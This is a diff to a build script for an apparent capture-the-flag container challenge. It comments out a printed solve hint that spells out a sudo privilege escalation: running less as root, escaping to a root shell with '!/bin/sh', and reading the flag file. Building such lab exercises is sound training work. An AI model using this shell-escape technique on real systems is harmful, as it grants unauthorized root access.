@@ -57,9 +57,9 @@ docker build -t "$IMAGE" app
 docker run -d --name "$CONTAINER" "$IMAGE" >/dev/null
 
 echo "✅ Built and started $CONTAINER from $IMAGE"
-echo
-echo "Manual solve hint (for players):"
-echo "  docker exec -it $CONTAINER bash"
-echo "  ctfuser@container$ sudo /usr/bin/less /etc/hosts"
-echo "  Inside less type:  !/bin/sh    (then press Enter)"
-echo "  # cat /root/flag.txt"
+#echo
+#echo "Manual solve hint (for players):"
+#echo "  docker exec -it $CONTAINER bash"
+#echo "  ctfuser@container$ sudo /usr/bin/less /etc/hosts"
+#echo "  Inside less type:  !/bin/sh    (then press Enter)"
+#echo "  # cat /root/flag.txt"
